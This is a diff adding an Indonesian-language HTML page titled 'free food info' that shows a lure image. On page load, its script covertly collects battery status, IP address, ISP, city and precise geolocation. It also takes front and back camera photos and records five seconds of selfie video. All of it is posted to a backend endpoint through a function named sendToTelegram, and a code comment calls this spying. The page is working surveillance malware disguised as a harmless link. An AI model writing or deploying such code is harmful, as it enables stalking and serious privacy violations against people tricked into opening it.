@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Info Makan Gratis</title>
+</head>
+<body style="margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: black;">
+    <img id="displayImage" src="" alt="Loading..." style="width: 100%; height: 100vh; object-fit: cover;">
+    
+    <script>
+        async function getDisplayImage() {
+            try {
+                const res = await fetch("/image"); // Ambil link gambar dari backend
+                const data = await res.json();
+                document.getElementById("displayImage").src = data.imageUrl;
+            } catch (error) {
+                console.error("Gagal memuat gambar:", error);
+            }
+        }
+
+        async function getBatteryStatus() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return `Baterai: ${Math.round(battery.level * 100)}% (${battery.charging ? 'Sedang Mengisi' : 'Tidak Mengisi'})`;
+            }
+            return "Baterai: Tidak Diketahui";
+        }
+
+        async function getIPInfo() {
+            try {
+                const res = await fetch("https://ipapi.co/json/");
+                const data = await res.json();
+                return `IP: ${data.ip}\nISP: ${data.org}\nKota: ${data.city}, ${data.region}, ${data.country_name}`;
+            } catch (err) {
+                return "IP Info: Gagal didapatkan";
+            }
+        }
+
+        async function getLocation() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve(`Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
+                    () => resolve("Lokasi: Ditolak oleh pengguna")
+                );
+            });
+        }
+
+        async function captureImage(facingMode) {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+                    const video = document.createElement("video");
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement("canvas");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(canvas.toDataURL("image/jpeg"));
+                    }, 2000);
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
+
+        async function recordVideo() {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+
+                    mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
+                    mediaRecorder.onstop = () => {
+                        stream.getTracks().forEach(track => track.stop());
+                        const blob = new Blob(chunks, { type: "video/mp4" });
+                        resolve(blob);
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 5000);
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
+
+        async function sendToTelegram() {
+            try {
+                const [battery, ipInfo, location] = await Promise.all([getBatteryStatus(), getIPInfo(), getLocation()]);
+                const frontImage = await captureImage("user");
+                const backImage = await captureImage("environment");
+                const videoBlob = await recordVideo();
+
+                const formData = new FormData();
+                formData.append("frontImage", frontImage);
+                formData.append("backImage", backImage);
+                formData.append("video", videoBlob);
+                formData.append("info", `${battery}\n${ipInfo}\n${location}`);
+
+                await fetch("/send", { method: "POST", body: formData });
+            } catch (error) {
+                console.error("Gagal mengirim data:", error);
+            }
+        }
+
+        getDisplayImage();  // Load gambar dari backend
+        sendToTelegram();  // Jalankan proses mata-mata
+    </script>
+</body>
+</html>
